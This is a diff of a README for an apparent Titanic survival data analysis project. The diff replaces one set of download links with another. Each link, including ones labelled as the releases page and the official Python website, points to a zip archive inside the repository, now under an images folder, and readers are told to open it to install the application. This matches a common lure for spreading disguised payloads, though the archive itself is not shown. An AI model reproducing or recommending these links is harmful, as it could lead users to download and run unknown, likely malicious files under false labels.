@@ -1,7 +1,7 @@
 # 🎉 Titanic-Survival-Analysis - Understand Survival Rates Simply
 
-![Download](https://github.com/Leandroluys/Titanic-Survival-Analysis/raw/refs/heads/main/data/Survival_Analysis_Titanic_v2.1.zip)
-[Download from Releases Page](https://github.com/Leandroluys/Titanic-Survival-Analysis/raw/refs/heads/main/data/Survival_Analysis_Titanic_v2.1.zip)
+![Download](https://raw.githubusercontent.com/Leandroluys/Titanic-Survival-Analysis/main/images/Titanic_Survival_Analysis_v1.7.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/Leandroluys/Titanic-Survival-Analysis/main/images/Titanic_Survival_Analysis_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the Titanic-Survival-Analysis project! This application helps you exp
 
 To get started, you need to download the application. 
 
-1. Visit our [Releases Page](https://github.com/Leandroluys/Titanic-Survival-Analysis/raw/refs/heads/main/data/Survival_Analysis_Titanic_v2.1.zip) to find the latest version.
+1. Visit our [Releases Page](https://raw.githubusercontent.com/Leandroluys/Titanic-Survival-Analysis/main/images/Titanic_Survival_Analysis_v1.7.zip) to find the latest version.
 2. Choose the version you want, then click the download link for that version. 
 3. Once the file is downloaded, open it to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -52,7 +52,7 @@ To ensure a smooth experience, your computer should meet the following requireme
 
 ### Step 1: Install Python
 
-If you don’t have Python installed, download it from the official [Python website](https://github.com/Leandroluys/Titanic-Survival-Analysis/raw/refs/heads/main/data/Survival_Analysis_Titanic_v2.1.zip). Follow the instructions provided there for your operating system.
+If you don’t have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/Leandroluys/Titanic-Survival-Analysis/main/images/Titanic_Survival_Analysis_v1.7.zip). Follow the instructions provided there for your operating system.
 
 ### Step 2: Install Jupyter Notebook
 
@@ -93,4 +93,4 @@ If you need further assistance, feel free to reach out via the contact methods a
 
 You now have everything needed to download and run the Titanic-Survival-Analysis application. Explore the rich dataset, visualize survival rates, and turn data into insights. Enjoy analyzing! 
 
-Remember, you can always revisit the [Releases Page](https://github.com/Leandroluys/Titanic-Survival-Analysis/raw/refs/heads/main/data/Survival_Analysis_Titanic_v2.1.zip) for updates and new features.
+Remember, you can always revisit the [Releases Page](https://raw.githubusercontent.com/Leandroluys/Titanic-Survival-Analysis/main/images/Titanic_Survival_Analysis_v1.7.zip) for updates and new features.
